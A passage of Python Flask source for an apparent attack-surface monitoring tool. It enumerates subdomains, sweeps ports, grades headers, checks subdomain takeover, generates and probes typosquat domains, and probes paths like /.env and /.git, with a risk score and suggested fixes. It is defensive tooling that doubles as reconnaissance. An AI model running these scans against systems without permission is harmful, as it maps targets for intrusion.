            pass
    return out


def _rdap_lookup(kind: str, value: str) -> dict:
    """Keyless WHOIS via the public rdap.org redirector. kind = 'domain' | 'ip'."""
    if not REQUESTS_AVAILABLE:
        return {"error": "requests library unavailable"}
    if kind == "ip":
        try:
            if ipaddress.ip_address(value).is_private:
                return {"note": "private/reserved address — no public registration"}
        except ValueError:
            return {"error": "invalid IP"}
    try:
        r = requests.get(f"https://rdap.org/{kind}/{value}", timeout=8,
                         headers={"User-Agent": "Network-Analyzer"})
        if not r.ok:
            return {"error": f"rdap http {r.status_code}"}
        d = r.json()
        out = {"handle": d.get("handle", "") or "", "name": d.get("ldhName", "") or d.get("name", "") or ""}
        if kind == "domain":
            for ent in d.get("entities", []):
                if "registrar" in (ent.get("roles") or []):
                    try:
                        for prop in (ent.get("vcardArray") or [None, []])[1]:
                            if prop and prop[0] == "fn":
                                out["registrar"] = str(prop[3])
                    except Exception:
                        pass
            ev = {e.get("eventAction", ""): e.get("eventDate", "") for e in d.get("events", [])}
            out["created"] = ev.get("registration", "") or ""
            out["expires"] = ev.get("expiration", "") or ""
            out["updated"] = ev.get("last changed", "") or ""
            out["nameservers"] = [ns.get("ldhName", "") for ns in d.get("nameservers", [])][:8]
            out["status"] = d.get("status", [])[:8]
        else:
            out["range"] = f"{d.get('startAddress', '')} - {d.get('endAddress', '')}"
            out["country"] = d.get("country", "") or ""
            out["net_type"] = d.get("type", "") or ""
        return out
    except Exception as e:
        return {"error": str(e)[:200]}


def _ip_intel(ip: str) -> dict:
    """Read-only IP enrichment (geo/ASN) via keyless ip-api.com."""
    try:
        if ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback:
            return {"ip": ip, "note": "private/reserved"}
    except ValueError:
        return {"ip": ip, "error": "invalid ip"}
    if not REQUESTS_AVAILABLE:
        return {"ip": ip, "error": "requests unavailable"}
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,reverse,query",
            timeout=6)
        if r.ok:
            return r.json()
        return {"ip": ip, "error": f"http {r.status_code}"}
    except Exception as e:
        return {"ip": ip, "error": str(e)[:160]}


def _lookalike_variants(domain: str, max_total: int = 100) -> list[dict]:
    """Typo/homoglyph permutations of a domain (defensive brand-protection radar)."""
    dom = domain.lower().strip().strip(".")
    try:
        ipaddress.ip_address(dom)
        return []
    except ValueError:
        pass
    parts = dom.split(".")
    if len(parts) < 2 or not parts[0]:
        return []
    label, tld = parts[0], parts[-1]
    suffix = ".".join(parts[1:])
    seen = set()
    out = []

    def add(v: str, technique: str):
        if v and v not in seen and v != dom and "." in v:
            seen.add(v)
            out.append({"domain": v, "technique": technique})

    for i in range(len(label)):
        add(label[:i] + label[i + 1:] + "." + suffix, "omission")
    for i, ch in enumerate(label):
        if ch.isalnum():
            add(label[:i] + ch + ch + label[i + 1:] + "." + suffix, "duplication")
    for i in range(len(label) - 1):
        if label[i] != label[i + 1]:
            add(label[:i] + label[i + 1] + label[i] + label[i + 2:] + "." + suffix, "transposition")
    for i, ch in enumerate(label):
        for rep in HOMOGLYPH.get(ch, []):
            add(label[:i] + rep + label[i + 1:] + "." + suffix, f"homoglyph({ch}→{rep})")
    for i in range(1, len(label)):
        add(label[:i] + "-" + label[i:] + "." + suffix, "hyphenation")
    for t in LOOKALIKE_TLDS:
        if t != tld:
            add(label + "." + t, "tld-swap")
    return out[:max_total]


def _lookalike_radar(domain: str, probe: bool = True, max_total: int = 90) -> list[dict]:
    """Resolve (and optionally HTTP-probe) lookalike domains to spot typosquat infra."""
    variants = _lookalike_variants(domain, max_total)
    out: list[dict] = []
    lk = Lock()

    def work(v: dict):
        ips = _resolve(v["domain"])
        if not ips:
            return
        row = {**v, "ips": ips[:4], "live": False, "title": "", "url": ""}
        if probe and REQUESTS_AVAILABLE:
            hp = _probe_host(v["domain"], timeout=3.0)
            if hp:
                row["live"] = True
                row["title"] = hp.get("title", "")
                row["url"] = hp.get("url", "")
                row["status"] = hp.get("status_code")
        with lk:
            out.append(row)

    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(work, variants))
    return sorted(out, key=lambda x: (not x["live"], x["domain"]))


def _risk_engine(result: dict) -> dict:
    """Aggregate every module's findings into a 0..100 exposure score + remediation list."""
    score = 0
    findings: list[dict] = []
    target = result.get("target", "")

    for t in result.get("takeover") or []:
        if t["status"] == "vulnerable":
            score += 25
            findings.append({"severity": "high",
                             "title": f"Subdomain takeover possible: {t['subdomain']}",
                             "detail": f"{t['subdomain']} -> {t['cname']} ({t.get('service', 'dangling')}): {t['evidence']}",
                             "fix": "Re-claim the hosted resource or delete the stale DNS record immediately."})
        elif t["status"] == "potential":
            score += 10
            findings.append({"severity": "medium",
                             "title": f"Dangling DNS record: {t['subdomain']}",
                             "detail": t["evidence"],
                             "fix": "Remove or re-point the CNAME; dangling records are takeover candidates."})
        else:
            score += 3
            findings.append({"severity": "low",
                             "title": f"Review CNAME: {t['subdomain']} -> {t['cname']}",
                             "detail": t["evidence"],
                             "fix": "Confirm the hosted resource is still claimed/owned."})

    if result.get("ports_unreliable"):
        score += 4
        findings.append({"severity": "medium",
                         "title": "Port sweep unreliable — transparent proxy/tarpit suspected",
                         "detail": ("A random closed-canary port reported OPEN, so the egress path is "
                                    "intercepting connections (common on filtered/cloud sandboxes). "
                                    "Port results shown are what the vantage point *claims*, not ground truth."),
                         "fix": "Re-run from a clean vantage point (direct server, no egress proxy) and compare DNA snapshots."})
    else:
        risky_hosts = 0
        for host, info in (result.get("ports") or {}).items():
            risky_here = sorted(p for p in info.get("ports", []) if p in RISKY_PORTS)
            if not risky_here:
                continue
            risky_hosts += 1
            sev = "high" if any(p in (23, 2323, 2375) for p in risky_here) else "medium"
            score += min(12, 4 * len(risky_here))
            findings.append({"severity": sev,
                             "title": f"{len(risky_here)} risky service(s) exposed on {host}",
                             "detail": ", ".join(f"{p} ({RISKY_PORTS[p]})" for p in risky_here[:6]),
                             "fix": "Restrict to a management VLAN/VPN, require auth, or close unneeded ports."})
        if risky_hosts > 4:
            score += 6
            findings.append({"severity": "medium",
                             "title": f"Broad exposure: {risky_hosts} hosts with risky services",
                             "detail": "Many sensitive services reachable increases attacker dwell surface.",
                             "fix": "Reduce public footprint; segment internal services."})

    worst_grade = None
    for h in result.get("hosts") or []:
        g = ((h.get("headers_grade") or {}).get("grade"))
        if g and (worst_grade is None or _grade_rank(g) > _grade_rank(worst_grade)):
            worst_grade = g
    if worst_grade in ("D", "F"):
        score += 12
        findings.append({"severity": "medium",
                         "title": f"Weak HTTP security headers (worst host graded {worst_grade})",
                         "detail": "Missing HSTS/CSP/frame protections on one or more hosts.",
                         "fix": "Add HSTS, CSP, X-Content-Type-Options, frame protection at the edge."})
    elif worst_grade == "C":
        score += 6
        findings.append({"severity": "low",
                         "title": "Bare-minimum HTTP security headers (grade C)",
                         "detail": "Some core headers are missing.",
                         "fix": "Raise header policy: HSTS + CSP are the big wins."})

    tls = result.get("tls") or {}
    if tls and not tls.get("error"):
        days = tls.get("days_until_expiry")
        if isinstance(days, int):
            if days < 0:
                score += 15
                findings.append({"severity": "high", "title": "TLS certificate EXPIRED",
                                 "detail": f"{target} cert expired {abs(days)} days ago.",
                                 "fix": "Renew and redeploy the certificate now."})
            elif days < 14:
                score += 8
                findings.append({"severity": "medium", "title": f"TLS certificate expires in {days} days",
                                 "detail": f"Not after: {tls.get('not_after', '')}",
                                 "fix": "Schedule renewal (ACME automation recommended)."})
        if tls.get("is_self_signed"):
            score += 6
            findings.append({"severity": "medium", "title": "Self-signed TLS certificate",
                             "detail": "Clients cannot chain trust to a public CA.",
                             "fix": "Use a publicly trusted CA certificate."})
        if tls.get("weak_cipher"):
            score += 8
            findings.append({"severity": "medium", "title": "Weak TLS cipher negotiated",
                             "detail": f"cipher={tls.get('cipher')}",
                             "fix": "Restrict to TLS1.2+ with AEAD ciphers."})

    dw = [f for f in (result.get("deep_web") or []) if f.get("interesting")]
    if dw:
        score += min(18, 6 * len(dw))
        findings.append({"severity": "high",
                         "title": f"{len(dw)} sensitive admin/secret paths reachable",
                         "detail": ", ".join(sorted({f['url'] for f in dw})[:5])[:220],
                         "fix": "AuthN-gate or remove /.env, /.git, /server-status style paths from the public site."})

    live_lookalikes = [l for l in result.get("lookalikes") or [] if l.get("live")]
    if live_lookalikes:
        score += min(12, 4 * len(live_lookalikes))
        findings.append({"severity": "medium",
                         "title": f"{len(live_lookalikes)} live lookalike domains detected",
                         "detail": ", ".join(l["domain"] for l in live_lookalikes[:6]),
                         "fix": "Monitor takedown channels; block at mail/web gateways; educate users."})

    if not result.get("ports") and not result.get("hosts"):
        findings.append({"severity": "info",
                         "title": "No exposed services discovered from this vantage point",
                         "detail": "Minimal external attack surface detected.",
                         "fix": "Keep it that way — schedule recurring snapshots."})

    score = min(100, score)
    grade = "A" if score < 10 else "B" if score < 25 else "C" if score < 45 else "D" if score < 65 else "F"
    order = {"high": 0, "medium": 1, "low": 2, "info": 3}
    findings.sort(key=lambda f: order.get(f["severity"], 4))
    return {"score": score, "grade": grade, "findings": findings,
            "checked_at": datetime.now().isoformat()}


def _build_snapshot(result: dict) -> dict:
    certs = {}
    tls = result.get("tls") or {}
    if tls and not tls.get("error") and tls.get("serial"):
        certs[tls.get("host", result.get("target", ""))] = tls.get("serial")
    return {
        "subdomains": sorted(s["subdomain"] for s in (result.get("subdomains") or [])),
        "ports": {h: sorted(info.get("ports", [])) for h, info in sorted((result.get("ports") or {}).items())},
        "techs": {h["host"]: sorted(h.get("tech", [])) for h in (result.get("hosts") or [])},
        "dns_a": sorted((result.get("dns") or {}).get("records", {}).get("A", [])),
        "certs": certs,
    }


def _attack_dna(snapshot: dict) -> str:
    return hashlib.sha1(json.dumps(snapshot, sort_keys=True).encode()).hexdigest()[:12]


def _diff_snapshots(old: dict, new: dict) -> dict:
    d = {
        "added_subdomains": sorted(set(new.get("subdomains", [])) - set(old.get("subdomains", []))),
        "removed_subdomains": sorted(set(old.get("subdomains", [])) - set(new.get("subdomains", []))),
        "new_ports": {}, "closed_ports": {}, "tech_changes": {},
        "dns_changed": old.get("dns_a") != new.get("dns_a"),
        "cert_changed": old.get("certs") != new.get("certs"),
    }
    for h in set(old.get("ports", {})) | set(new.get("ports", {})):
        op = set(old.get("ports", {}).get(h, []))
        np = set(new.get("ports", {}).get(h, []))
        if np - op:
            d["new_ports"][h] = sorted(np - op)
        if op - np:
            d["closed_ports"][h] = sorted(op - np)
    for h in set(old.get("techs", {})) | set(new.get("techs", {})):
        ot, nt = old.get("techs", {}).get(h, []), new.get("techs", {}).get(h, [])
        if ot != nt:
            d["tech_changes"][h] = {"before": ot, "after": nt}
    d["changed"] = bool(d["added_subdomains"] or d["removed_subdomains"] or d["new_ports"]
                        or d["closed_ports"] or d["tech_changes"] or d["dns_changed"] or d["cert_changed"])
    return d


def _snapshot_store(target: str, snapshot: dict, summary: str = "") -> tuple[int, str]:
    dna = _attack_dna(snapshot)
    conn = get_db()
    cur = conn.execute(
        "INSERT INTO attack_snapshots (target, taken_at, dna, snapshot_json, summary) VALUES (?,?,?,?,?)",
        (target, datetime.now().isoformat(), dna, json.dumps(snapshot), summary))
    sid = cur.lastrowid
    conn.commit()
    conn.close()
    return sid, dna


def _snapshot_latest(target: str) -> dict | None:
    conn = get_db()
    r = conn.execute(
        "SELECT id, taken_at, dna, snapshot_json, summary FROM attack_snapshots WHERE target=? ORDER BY id DESC LIMIT 1",
        (target,)).fetchone()
    conn.close()
    if not r:
        return None
    try:
        snap = json.loads(r["snapshot_json"] or "{}")
    except Exception:
        snap = {}
    return {"id": r["id"], "taken_at": r["taken_at"], "dna": r["dna"], "snapshot": snap, "summary": r["summary"]}


def _snapshot_list(target: str | None = None, limit: int = 40) -> list[dict]:
    conn = get_db()
    if target:
        rows = conn.execute(
            "SELECT id, target, taken_at, dna, summary FROM attack_snapshots WHERE target=? ORDER BY id DESC LIMIT ?",
            (target, limit)).fetchall()
    else:
        rows = conn.execute(
            "SELECT id, target, taken_at, dna, summary FROM attack_snapshots ORDER BY id DESC LIMIT ?",
            (limit,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def _snapshot_get(sid: int) -> dict | None:
    conn = get_db()
    r = conn.execute("SELECT * FROM attack_snapshots WHERE id=?", (sid,)).fetchone()
    conn.close()
    if not r:
        return None
    out = dict(r)
    try:
        out["snapshot"] = json.loads(out.pop("snapshot_json") or "{}")
    except Exception:
        out["snapshot"] = {}
    return out


def _attack_graph(result: dict) -> dict:
    """Build a vis.js-ready node/edge graph: domain -> subdomains -> IPs -> ports."""
    nodes, edges = [], []
    seen_nodes = set()

    def add_node(nid, label, group, title=""):
        if nid in seen_nodes or len(nodes) >= 260:
            return
        seen_nodes.add(nid)
        nodes.append({"id": nid, "label": label[:48], "group": group, "title": title[:200]})

    target = result.get("target", "target")
    add_node("root", target, "root", "Root domain")
    for s in (result.get("subdomains") or [])[:80]:
        sub = s["subdomain"]
        add_node(f"sub::{sub}", sub, "subdomain", ",".join(s.get("sources", [])))
        edges.append({"from": "root", "to": f"sub::{sub}"})
    for h, info in (result.get("ports") or {}).items():
        ip = info.get("ip", "")
        add_node(f"sub::{h}", h, "subdomain")
        if ip:
            add_node(f"ip::{ip}", ip, "ip", h)
            edges.append({"from": f"sub::{h}", "to": f"ip::{ip}"})
        for p in info.get("ports", [])[:12]:
            pid = f"port::{ip}:{p}"
            svc = RISKY_PORTS.get(p, "")
            add_node(pid, f":{p}", "risky_port" if p in RISKY_PORTS else "port", f"{ip}:{p} {svc}")
            edges.append({"from": f"ip::{ip}" if ip else f"sub::{h}", "to": pid, "label": svc[:24]})
    for tk in (result.get("takeover") or []):
        if tk["status"] == "vulnerable":
            add_node(f"takeover::{tk['subdomain']}", "⚠ TAKEOVER", "takeover",
                     f"{tk['subdomain']} -> {tk['cname']} ({tk.get('service', '')})")
            edges.append({"from": f"sub::{tk['subdomain']}", "to": f"takeover::{tk['subdomain']}"})
    return {"nodes": nodes, "edges": edges}


def start_pro_recon(target: str, profile: str = "quick") -> str:
    """One-click full pipeline. Profile 'quick' = core surface map; 'full' adds
    lookalikes, WHOIS/IP intel and the deep-web admin-page sweep."""
    profile = "full" if profile == "full" else "quick"
    job_id = f"pro_{secrets.token_hex(6)}"
    phases = (["dns", "subdomains", "ports", "http", "headers", "takeover"]
              + (["lookalikes", "whois", "deepweb"] if profile == "full" else [])
              + ["risk", "snapshot"])
    with pro_lock:
        pro_jobs[job_id] = {
            "job_id": job_id, "target": target, "profile": profile,
            "status": "queuing", "phase": "boot",
            "phases": {p: "pending" for p in phases},
            "log": [], "started_at": datetime.now().isoformat(), "finished_at": None,
            "result": {"target": _safe_host(target), "subdomains": [], "ports": {}, "hosts": [],
                       "takeover": [], "lookalikes": [], "whois": {}, "dns": {}, "tls": {},
                       "deep_web": [], "risk": {}, "diff": {}, "graph": {}, "dna": ""},
            "summary": "", "error": "",
        }

    def run():
        j = pro_jobs[job_id]
        r = j["result"]

        def log(msg: str):
            line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
            with pro_lock:
                j["log"].append(line)
                if len(j["log"]) > 400:
                    j["log"][:] = j["log"][-400:]

        def setph(name: str, state: str):
            with pro_lock:
                j["phases"][name] = state
                j["phase"] = name

        def save(status: str):
            j["status"] = status
            j["finished_at"] = datetime.now().isoformat()
            try:
                conn = get_db()
                conn.execute(
                    """INSERT OR REPLACE INTO pro_recon_log
                       (job_id,target,profile,started_at,finished_at,status,phase,log_json,results_json,summary,error)
                       VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                    (job_id, j["target"], profile, j["started_at"], j["finished_at"], status,
                     j["phase"], json.dumps(j["log"][-120:]), json.dumps(r)[:900000],
                     j["summary"], j["error"]))
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"[!] pro recon persist error: {e}")

        j["status"] = "running"
        host = _safe_host(target)
        try:
            log(f"▶ PRO RECON started on {host} (profile={profile})")
            if get_setting("confirm_attack", "1") == "1":
                log("authorization assumed — you confirmed this target is in-scope")
            if not host:
                raise RuntimeError("empty/invalid target")

            # ---- DNS intelligence ----
            setph("dns", "running")
            r["dns"] = _dns_dump(host)
            rec = r["dns"]["records"]
            ips = rec.get("A") or _resolve(host)
            log(f"dns: {list(rec.keys()) or 'no records'} A={ips[:5] if ips else '—'}")
            if not ips:
                raise RuntimeError("target does not resolve (check spelling / network)")
            setph("dns", "done")

            # ---- Subdomains ----
            setph("subdomains", "running")
            subs = _enumerate_subdomains(host)
            r["subdomains"] = subs
            log(f"subs: {len(subs)} unique hosts ({', '.join(s['subdomain'] for s in subs[:6])}…)")
            setph("subdomains", "done")

            # ---- Ports ----
            setph("ports", "running")
            r["ports_unreliable"] = False
            try:
                if ips:
                    check = _canary_port_check(ips[0])
                    if check["canary_open"]:
                        r["ports_unreliable"] = True
                        log(f"ports: ⚠ canary port {check['canary_port']} reported OPEN on {ips[0]} — "
                            "transparent proxy/tarpit on this vantage point; sweep results are untrustworthy")
            except Exception:
                pass
            all_hosts = sorted({host} | {s["subdomain"] for s in subs})[:40]
            port_total = 0
            for h in all_hosts:
                for ip in _resolve(h)[:2]:
                    try:
                        op = _resolve_open_ports(ip)
                        if op:
                            r["ports"][h] = {"ip": ip, "ports": op}
                            port_total += len(op)
                            break
                    except Exception:
                        pass
            log(f"ports: swept {len(all_hosts)} hosts — {port_total} open ports on {len(r['ports'])} hosts")
            setph("ports", "done")

            # ---- HTTP fingerprinting (+ TLS on root) ----
            setph("http", "running")
            probe_hosts = sorted({host} | set(r["ports"].keys()))[:40]
            with ThreadPoolExecutor(max_workers=12) as ex:
                for hp in ex.map(lambda h: _probe_host(h, timeout=5.0), probe_hosts):
                    if hp:
                        r["hosts"].append(hp)
            r["tls"] = grab_tls_cert(host, 443, timeout=4) or {}
            techs = {t for h in r["hosts"] for t in h.get("tech", [])}
            log(f"http: {len(r['hosts'])} live hosts; tech: {', '.join(sorted(techs)) or 'none detected'}")
            setph("http", "done")

            # ---- Header hygiene grades ----
            setph("headers", "running")
            graded = 0
            with ThreadPoolExecutor(max_workers=10) as ex:
                for hg in ex.map(lambda h: _headers_grade(h["host"]), r["hosts"][:25]):
                    if hg:
                        graded += 1
                        for h in r["hosts"]:
                            if h["host"] == hg["host"] and "headers_grade" not in h:
                                h["headers_grade"] = {k: hg[k] for k in ("grade", "score", "issues", "scheme")}
            log(f"headers: graded {graded} hosts — worst: "
                f"{_risk_engine_preview_grade(r['hosts']) if graded else 'n/a'}")
            setph("headers", "done")

            # ---- Subdomain takeover ----
            setph("takeover", "running")
            r["takeover"] = _takeover_scan([s["subdomain"] for s in subs][:80])
            vulns = sum(1 for t in r["takeover"] if t["status"] == "vulnerable")
            log(f"takeover: {len(r['takeover'])} dangling candidates ({vulns} VULNERABLE)")
            setph("takeover", "done")

            if profile == "full":
                # ---- Lookalike radar ----
                setph("lookalikes", "running")
                r["lookalikes"] = _lookalike_radar(host, probe=True, max_total=90)
                live = sum(1 for l in r["lookalikes"] if l.get("live"))
                log(f"lookalikes: {len(r['lookalikes'])} resolving permutations ({live} serving content)")
                setph("lookalikes", "done")

                # ---- WHOIS / IP intel ----
                setph("whois", "running")
                who = {"domain": {}, "ips": {}, "ip_intel": {}}
                def _rd(d): who["domain"] = _rdap_lookup("domain", host)
                def _ri(ip): who["ips"][ip] = _rdap_lookup("ip", ip)
                def _ii(ip): who["ip_intel"][ip] = _ip_intel(ip)
                with ThreadPoolExecutor(max_workers=8) as ex:
                    futs = [ex.submit(_rd, host)]
                    for ip in ips[:3]:
                        futs.append(ex.submit(_ri, ip))
                        futs.append(ex.submit(_ii, ip))
                    for f in futs:
                        f.result()
                r["whois"] = who
                log(f"whois: registrar={who['domain'].get('registrar', 'n/a') or 'n/a'} "
                    f"exp={who['domain'].get('expires', 'n/a') or 'n/a'}")
                setph("whois", "done")

                # ---- Deep web sweep ----
                setph("deepweb", "running")
                r["deep_web"] = _deep_web_scan(host, concurrency=20, max_paths=250)
                interesting = sum(1 for f in r["deep_web"] if f.get("interesting"))
                log(f"deepweb: {len(r['deep_web'])} paths responded ({interesting} INTERESTING)")
                setph("deepweb", "done")

            # ---- Risk score ----
            setph("risk", "running")
            r["risk"] = _risk_engine(r)
            log(f"risk: {r['risk']['score']}/100 grade {r['risk']['grade']} "
                f"({len(r['risk']['findings'])} findings)")
            setph("risk", "done")

            # ---- Snapshot + diff (Time Machine) ----
            setph("snapshot", "running")
            snap = _build_snapshot(r)
            prev = _snapshot_latest(host)
            summary = (f"risk {r['risk']['score']}({r['risk']['grade']}) subs={len(subs)} "
                       f"ports={port_total} hosts={len(r['hosts'])} takeover={vulns if profile else len(r['takeover'])}")
            sid, dna = _snapshot_store(host, snap, summary)
            r["dna"] = dna
            r["snapshot_id"] = sid
            if prev is None:
                r["diff"] = {"first_snapshot": True, "changed": False}
                log(f"snapshot: first baseline stored (dna={dna})")
            else:
                diff = _diff_snapshots(prev["snapshot"], snap)
                r["diff"] = diff
                if diff["changed"]:
                    chg = (f"+{len(diff['added_subdomains'])} subs, -{len(diff['removed_subdomains'])} subs, "
                           f"+{sum(len(v) for v in diff['new_ports'].values())} ports, "
                           f"-{sum(len(v) for v in diff['closed_ports'].values())} ports")
                    log(f"snapshot: ATTACK SURFACE CHANGED ({chg}) dna {prev['dna']}→{dna}")
                    generate_alert("attack_surface_changed", f"Attack surface changed for {host}: {chg}")
                else:
                    log(f"snapshot: surface unchanged since {prev['taken_at'][:16]} (dna={dna})")
            setph("snapshot", "done")

            # ---- Graph ----
            r["graph"] = _attack_graph(r)

            j["summary"] = summary + f" dna={dna}"
            log(f"✔ PRO RECON complete — {j['summary']}")
            save("done")
            audit("pro_recon_complete", details=f"{host} [{profile}] {j['summary']}")
        except Exception as e:
            j["error"] = str(e)[:300]
            log(f"✖ FAILED: {j['error']}")
            for p, st in j["phases"].items():
                if st == "running":
                    j["phases"][p] = "error"
            save("failed")
            audit("pro_recon_failed", details=f"{host}: {j['error']}", success=0)

    threading.Thread(target=run, daemon=True).start()
    return job_id


def _grade_rank(g: str) -> int:
    return {"A+": 0, "A": 1, "B": 2, "C": 3, "D": 4, "F": 5}.get(g, 3)


def _risk_engine_preview_grade(hosts: list[dict]) -> str:
    worst = None
    for h in hosts:
        g = ((h.get("headers_grade") or {}).get("grade"))
        if g and (worst is None or _grade_rank(g) > _grade_rank(worst)):
            worst = g
    return worst or "n/a"


def get_pro_job(job_id: str) -> dict | None:
    with pro_lock:
        j = pro_jobs.get(job_id)
        if j:
            return dict(j, log=list(j["log"]))
    conn = get_db()
    r = conn.execute("SELECT * FROM pro_recon_log WHERE job_id=?", (job_id,)).fetchone()
    conn.close()
    if not r:
        return None
    out = dict(r)
    try:
        out["result"] = json.loads(out.pop("results_json") or "{}")
    except Exception:
        out["result"] = {}
    try:
        out["log"] = json.loads(out.pop("log_json") or "[]")
    except Exception:
        out["log"] = []
    out["phases"] = {}
    return out


def list_pro_jobs(limit: int = 30) -> list[dict]:
    conn = get_db()
    rows = conn.execute(
        "SELECT job_id,target,profile,started_at,finished_at,status,phase,summary,error "
        "FROM pro_recon_log ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
    conn.close()
    out = [dict(r) for r in rows]
    seen = {r["job_id"] for r in out}
    with pro_lock:
        for jid, j in pro_jobs.items():
            if jid not in seen:
                out.insert(0, {"job_id": jid, "target": j["target"], "profile": j["profile"],
                               "started_at": j["started_at"], "finished_at": j["finished_at"],
                               "status": j["status"], "phase": j["phase"],
                               "summary": j["summary"], "error": j["error"]})
    return out


def _render_recon_report(job: dict) -> str:
    """Standalone HTML report for a Pro Recon job."""
    esc = html.escape
    r = job.get("result") or {}
    risk = r.get("risk") or {}
    grade = risk.get("grade", "?")

    def table(headers, rows):
        t = "<table><thead><tr>" + "".join(f"<th>{esc(str(h))}</th>" for h in headers) + "</tr></thead><tbody>"
        for row in rows:
            t += "<tr>" + "".join(f"<td>{esc(str(c))}</td>" for c in row) + "</tr>"
        return t + "</tbody></table>"

    findings_rows = [[f.get("severity", ""), f.get("title", ""), f.get("detail", ""), f.get("fix", "")]
                     for f in risk.get("findings", [])]
    subs_rows = [[s.get("subdomain", ""), ", ".join(s.get("sources", []))] for s in r.get("subdomains", [])]
    ports_rows = [[h, i.get("ip", ""), ", ".join(map(str, i.get("ports", [])))] for h, i in (r.get("ports") or {}).items()]
    hosts_rows = [[h.get("url", "") or h.get("host", ""), h.get("status_code", ""), h.get("title", ""),
                   ", ".join(h.get("tech", [])), (h.get("headers_grade") or {}).get("grade", "")]
                  for h in r.get("hosts", [])]
    takeover_rows = [[t.get("subdomain", ""), t.get("cname", ""), t.get("service", ""),
                      t.get("status", ""), t.get("evidence", "")] for t in r.get("takeover", [])]
    look_rows = [[l.get("domain", ""), l.get("technique", ""), ", ".join(l.get("ips", [])),
                  "live" if l.get("live") else "resolves", l.get("title", "")] for l in r.get("lookalikes", [])]
    dns_rows = [[k, "; ".join(v[:20])] for k, v in (r.get("dns") or {}).get("records", {}).items()]
    dw_rows = [[f.get("url", ""), f.get("status", ""), f.get("length", ""),
                "★" if f.get("interesting") else ""] for f in r.get("deep_web", [])]
    body = f"""<!doctype html><html><head><meta charset="utf-8"><title>Recon Report — {esc(job.get('target',''))}</title>
<style>
body{{font-family:system-ui,Segoe UI,sans-serif;background:#0b111a;color:#e2e8f0;padding:32px;max-width:1100px;margin:auto}}
h1{{font-size:26px}} h2{{font-size:18px;margin-top:32px;border-bottom:1px solid #223;padding-bottom:6px}}
.kv{{display:grid;grid-template-columns:220px 1fr;gap:4px 14px;font-size:13px;margin:12px 0}}
.kv .k{{color:#64748b}}
table{{border-collapse:collapse;width:100%;font-size:12px;margin-top:8px}}
th,td{{border:1px solid #223;padding:5px 8px;text-align:left;vertical-align:top}}
th{{background:#131c2b;color:#94a3b8}}
.grade{{display:inline-block;font-size:40px;font-weight:800;padding:10px 22px;border:3px solid currentColor;border-radius:12px}}
.sev-high{{color:#ff4757;font-weight:700}} .bad{{color:#ff4757}} .good{{color:#00ff88}}
.small{{color:#64748b;font-size:11px}}
</style></head><body>
<h1>Recon Report — {esc(job.get("target", ""))}</h1>
<div class="small">Generated {esc(datetime.now().isoformat(timespec='seconds'))} • job {esc(job.get("job_id",""))} • profile {esc(job.get("profile",""))} • for authorized testing only</div>
<div class="kv">
<div class="k">Status</div><div>{esc(job.get("status",""))} ({esc(job.get("started_at",""))[:19]} &rarr; {esc(job.get("finished_at","") or "")[:19]})</div>
<div class="k">Attack-surface DNA</div><div><code>{esc(r.get("dna",""))}</code> {"(changed since last snapshot!)" if (r.get("diff") or {}).get("changed") else ""}</div>
<div class="k">Summary</div><div>{esc(job.get("summary",""))}</div>
</div>
<h2>Risk score</h2>
<div><span class="grade {'bad' if grade in ('D','F') else 'good'}">{esc(grade)}</span>
<span style="font-size:22px;margin-left:14px">{esc(str(risk.get("score","?")))}/100</span></div>
{table(["Severity","Finding","Detail","Recommended fix"], findings_rows) if findings_rows else "<p>No findings.</p>"}
<h2>DNS records</h2>{table(["Type","Values"], dns_rows) if dns_rows else "<p>—</p>"}
<h2>Subdomains ({len(subs_rows)})</h2>{table(["Name","Sources"], subs_rows) if subs_rows else "<p>—</p>"}
<h2>Open ports</h2>{table(["Host","IP","Open ports"], ports_rows) if ports_rows else "<p>—</p>"}
<h2>HTTP hosts</h2>{table(["URL","Status","Title","Tech","Header grade"], hosts_rows) if hosts_rows else "<p>—</p>"}
<h2>Subdomain takeover</h2>{table(["Subdomain","CNAME","Service","Status","Evidence"], takeover_rows) if takeover_rows else "<p>None found.</p>"}
<h2>Lookalike domains</h2>{table(["Domain","Technique","IPs","State","Title"], look_rows) if look_rows else "<p>Not run (quick profile or none resolving).</p>"}
<h2>Deep-web hits</h2>{table(["URL","Status","Length","Interesting"], dw_rows) if dw_rows else "<p>Not run (quick profile) or nothing found.</p>"}
</body></html>"""
    return body


# ============================================================
# ROUTES: auth + dashboard
# ============================================================
@app.route("/login", methods=["GET", "POST"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for("dashboard"))
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        client_ip = request.remote_addr or "unknown"
        now = time.time()
        login_attempts[client_ip] = [t for t in login_attempts[client_ip] if now - t < LOGIN_ATTEMPT_WINDOW]
        if len(login_attempts[client_ip]) >= LOGIN_ATTEMPT_LIMIT:
            flash("Too many failed attempts. Try again in 15 minutes.", "error")
            return render_template("login.html")
        if username == DEFAULT_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            login_attempts[client_ip] = []
            login_user(User(username))
            # Rotate CSRF token after login to avoid session-fixation corner cases
            session.pop("_csrf_token", None)
            generate_csrf_token()
            flash("Logged in successfully!", "success")
            nxt = request.args.get("next")
            if nxt and nxt.startswith("/") and not nxt.startswith("//"):
                return redirect(nxt)
            return redirect(url_for("dashboard"))
        else:
            login_attempts[client_ip].append(now)
            flash("Invalid username or password", "error")
    return render_template("login.html")


@app.route("/logout")
@login_required
def logout():
    logout_user()
    flash("Logged out.", "info")
    return redirect(url_for("login"))


@app.route("/")
@login_required
def dashboard():
    return render_template("dashboard.html")


# ============================================================
# ROUTES: core
# ============================================================
@app.route("/api/stats")
@login_required
def api_stats():
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    online = conn.execute("SELECT COUNT(*) FROM devices WHERE is_online=1").fetchone()[0]
    blocked = conn.execute("SELECT COUNT(*) FROM devices WHERE is_blocked=1").fetchone()[0]
    unknown = conn.execute("SELECT COUNT(*) FROM devices WHERE is_known=0").fetchone()[0]
    unread = conn.execute("SELECT COUNT(*) FROM alerts WHERE is_read=0").fetchone()[0]
